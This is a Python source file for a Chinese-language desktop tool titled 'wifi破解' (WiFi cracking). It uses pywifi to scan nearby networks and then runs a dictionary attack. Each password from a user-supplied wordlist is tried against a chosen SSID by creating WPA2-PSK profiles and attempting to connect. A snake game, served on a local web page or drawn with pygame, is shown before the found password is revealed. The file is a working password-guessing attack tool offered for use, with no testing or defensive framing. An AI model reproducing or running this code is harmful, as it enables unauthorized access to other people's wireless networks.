from tkinter import *
from tkinter import ttk
import hashlib
# from pyQt5 import QtWidgets
import pywifi
from pywifi import const
import time
import tkinter.filedialog # 在Gui中打开文件浏览
import tkinter.messagebox # 打开tkiner的消息提醒框
import pygame
import random
import webbrowser


class MY_GUI():
	def __init__(self,init_window_name):
		self.init_window_name = init_window_name

		#密码文件路径
		self.get_value = StringVar() # 设置可变内容

		#获取破解wifi账号

		self.get_wifi_value = StringVar()

		#获取wifi密码
		self.get_wifimm_value = StringVar()

		self.wifi = pywifi.PyWiFi()  #抓取网卡接口
		self.iface = self.wifi.interfaces()[0] #抓取第一个无线网卡
		self.iface.disconnect()  #测试链接断开所有链接
		#测试网卡是否属于断开状态
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

	def __str__(self):
        # 自动会调用的函数，返回自身的网卡
		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())

	#设置窗口
	def set_init_window(self):
		self.init_window_name.title("wifi破解")
		self.init_window_name.geometry('+500+200')

		labelframe = LabelFrame(width=400, height=200,text="配置")  # 框架，以下对象都是对于labelframe中添加的
		labelframe.grid(column=0, row=0, padx=10, pady=10)

		self.search = Button(labelframe,text="搜索附近WiFi",command=self.scans_wifi_list).grid(column=0,row=0)
		#setStyleSheet('''background-imge : url('imgs/wifiBg.jpg')''')

		self.pojie = Button(labelframe,text="开始破解",command=self.readPassWord).grid(column=1,row=0)

		self.Reget = Button(labelframe, text="获取密码",command=self.RegetPassWord ).grid(column=2, row=0)  # 重新获取功能

		self.label = Label(labelframe,text="目录路径：").grid(column=0,row=1)

		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)

		self.file = Button(labelframe,text="添加破译算法文件",command=self.add_mm_file).grid(column=2,row=1)

		self.wifi_text = Label(labelframe,text="WiFi账号：").grid(column=0,row=2)

		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)

		self.wifi_mm_text = Label(labelframe,text="WiFi密码：").grid(column=2,row=2)

		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)

		self.wifi_labelframe = LabelFrame(text="wifi列表")
		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)


		# 定义树形结构与滚动条
		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show="headings",columns=("a", "b", "c", "d"))
		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
		self.wifi_tree.configure(yscrollcommand=self.vbar.set)

		# 表格的标题
		self.wifi_tree.column("a", width=50, anchor="center")
		self.wifi_tree.column("b", width=100, anchor="center")
		self.wifi_tree.column("c", width=100, anchor="center")
		self.wifi_tree.column("d", width=100, anchor="center")

		self.wifi_tree.heading("a", text="WiFiID")
		self.wifi_tree.heading("b", text="SSID")
		self.wifi_tree.heading("c", text="BSSID")
		self.wifi_tree.heading("d", text="signal")

		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
		self.wifi_tree.bind("<Double-1>",self.onDBClick)
		self.vbar.grid(row=4,column=1,sticky=NS)

	#搜索wifi
	#cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
	def scans_wifi_list(self):  # 扫描周围wifi列表
		#开始扫描
		print("^_^ 开始扫描附近wifi...")
		self.iface.scan()
		time.sleep(1)
		#在若干秒后获取扫描结果
		scanres = self.iface.scan_results()
		#统计附近被发现的热点数量
		nums = len(scanres)
		print("数量: %s"%(nums))
		#print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
		# 实际数据
		self.show_scans_wifi_list(scanres)
		return scanres

	#显示wifi列表
	def show_scans_wifi_list(self,scans_res):
		for index,wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
			self.wifi_tree.insert("",'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
			#print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

	#添加密码文件目录
	def add_mm_file(self):
		self.filename = tkinter.filedialog.askopenfilename()
		self.get_value.set(self.filename)

	#Treeview绑定事件
	def onDBClick(self,event):
		self.sels= event.widget.selection()
		self.get_wifi_value.set(self.wifi_tree.item(self.sels,"values")[1])
		# self.RegetPassWord
		#print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

	#读取密码字典，进行匹配
	def readPassWord(self):
		self.getFilePath = self.get_value.get()

		self.get_wifissid = self.get_wifi_value.get()

		pwdfilehander=open(self.getFilePath,"r",errors="ignore")
		while True:
				try:
					self.pwdStr=pwdfilehander.readline()

					if not self.pwdStr:
						break
					self.bool1=self.connect(self.pwdStr,self.get_wifissid)

					if self.bool1:
						self.res = "===正确===  wifi名:%s  匹配密码：%s "%(self.get_wifissid,self.pwdStr)
						self.get_wifimm_value.set("*******")
						# tkinter.messagebox.showinfo('提示', '破解成功！！！ ,完成游戏以获取密码')
						flag = tkinter.messagebox.askokcancel('提示', '破解成功！！！ ,完成游戏以获取密码')
						# askokcancel提示框可以返回True或False方便逻辑判断showinfo只有确定框
						if flag:
							url = "http://localhost:5173/"
							webbrowser.open(url)
							# tanChiGame()
							time.sleep(5)
							self.get_wifimm_value.set(self.pwdStr)
							tkinter.messagebox.showinfo('提示', "密码是" + self.pwdStr)
							print(self.res)
						#else:

						break
					else:
						hash_object = hashlib.sha256()

						# 更新哈希对象
						hash_object.update(self.pwdStr.encode())

						# 获取加密结果
						hashed_string = hash_object.hexdigest()
						self.res = "---错误--- wifi名:%s匹配密码：%s"%(self.get_wifissid,hashed_string)
						print(self.res)
						time.sleep(0.2)
				except:
					continue

	# 再次游戏以获取密码
	def RegetPassWord(self):
		try:
			if self.bool1:
				flag = tkinter.messagebox.askokcancel('提示', '体验游戏获取密码')
				# askokcancel提示框可以返回True或False方便逻辑判断showinfo只有确定框
				if flag:
					# tanChiGame()
					url = "http://localhost:5173/"
					webbrowser.open(url)
					time.sleep(5)
					self.get_wifimm_value.set(self.pwdStr)
					tkinter.messagebox.showinfo('提示', "密码是" + self.pwdStr)
					print(self.res)
			else:
				tkinter.messagebox.showwarning('提示', "破解成功后才能获取密码")
		except:
			tkinter.messagebox.showwarning('提示', "破解成功后才能获取密码")
	#对wifi和密码进行匹配
	def connect(self,pwd_Str,wifi_ssid):
		#创建wifi链接文件
		self.profile = pywifi.Profile()
		self.profile.ssid =wifi_ssid #wifi名称
		self.profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
		self.profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
		self.profile.key = pwd_Str #密码
		self.iface.remove_all_network_profiles() #删除所有的wifi文件
		self.tmp_profile = self.iface.add_network_profile(self.profile)#设定新的链接文件
		self.iface.connect(self.tmp_profile)#链接
		time.sleep(1)
		if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
			isOK=True
		else:
			isOK=False
		self.iface.disconnect() #断开
		time.sleep(0.2)
		#检查断开状态
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
		return isOK

def gui_start():
	init_window = Tk()
	ui = MY_GUI(init_window)
	print(ui)
	ui.set_init_window()
	#ui.scans_wifi_list()

	init_window.mainloop()


def tanChiGame():

    # 游戏窗口大小
    WINDOW_WIDTH = 800
    WINDOW_HEIGHT = 600

    # 蛇身和食物大小
    CELL_SIZE = 20

    # 颜色定义
    BLACK = (0, 0, 0)
    WHITE = (255, 255, 255)
    RED = (255, 0, 0)

    # 初始化pygame
    pygame.init()

    # 游戏时钟
    clock = pygame.time.Clock()

    # 蛇的初始位置
    snake_x = WINDOW_WIDTH // 2
    snake_y = WINDOW_HEIGHT // 2

    # 蛇的初始速度
    snake_speed_x = 0
    snake_speed_y = 0

    # 蛇的初始长度
    snake_length = 1
    snake_body = []

    # 食物的初始位置
    food_x = random.randint(0, (WINDOW_WIDTH - CELL_SIZE) // CELL_SIZE) * CELL_SIZE
    food_y = random.randint(0, (WINDOW_HEIGHT - CELL_SIZE) // CELL_SIZE) * CELL_SIZE

    # 游戏结束标志
    game_over = False
    # 游戏主循环
    while not game_over:
        # 处理事件
        for event in pygame.event.get():
            if event.type == pygame.QUIT:#关闭按钮
                game_over = True
            elif event.type == pygame.KEYDOWN:#表示用户按下了一个键
                if event.key == pygame.K_UP and snake_speed_y != CELL_SIZE:#按键与蛇头反向检测
                    snake_speed_x = 0
                    snake_speed_y = -CELL_SIZE
                elif event.key == pygame.K_DOWN and snake_speed_y != -CELL_SIZE:
                    snake_speed_x = 0
                    snake_speed_y = CELL_SIZE
                elif event.key == pygame.K_LEFT and snake_speed_x != CELL_SIZE:
                    snake_speed_x = -CELL_SIZE
                    snake_speed_y = 0
                elif event.key == pygame.K_RIGHT and snake_speed_x != -CELL_SIZE:
                    snake_speed_x = CELL_SIZE
                    snake_speed_y = 0

        # 更新蛇的位置
        snake_x += snake_speed_x
        snake_y += snake_speed_y

        # 判断蛇是否吃到食物
        if snake_x == food_x and snake_y == food_y:
            snake_length += 1
            food_x = random.randint(0, (WINDOW_WIDTH - CELL_SIZE) // CELL_SIZE) * CELL_SIZE
            food_y = random.randint(0, (WINDOW_HEIGHT - CELL_SIZE) // CELL_SIZE) * CELL_SIZE

        # 更新蛇的身体
        snake_body.append((snake_x, snake_y))
        if len(snake_body) > snake_length:
            del snake_body[0]

        # 判断蛇是否撞到自己
        if (snake_x, snake_y) in snake_body[:-1]:
            game_over = True

        # 判断蛇是否撞到墙壁
        if snake_x < 0 or snake_x >= WINDOW_WIDTH or snake_y < 0 or snake_y >= WINDOW_HEIGHT:
            game_over = True
        # 创建游戏窗口
        window = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
        pygame.display.set_caption("贪吃蛇游戏")

        # 绘制游戏窗口
        window.fill(BLACK)
        for body_part in snake_body:
            pygame.draw.rect(window, WHITE, (body_part[0], body_part[1], CELL_SIZE, CELL_SIZE))
        pygame.draw.rect(window, RED, (food_x, food_y, CELL_SIZE, CELL_SIZE))
        pygame.display.update()

        # 控制游戏帧率
        clock.tick(15)
    # 退出游戏
    pygame.quit()
gui_start()
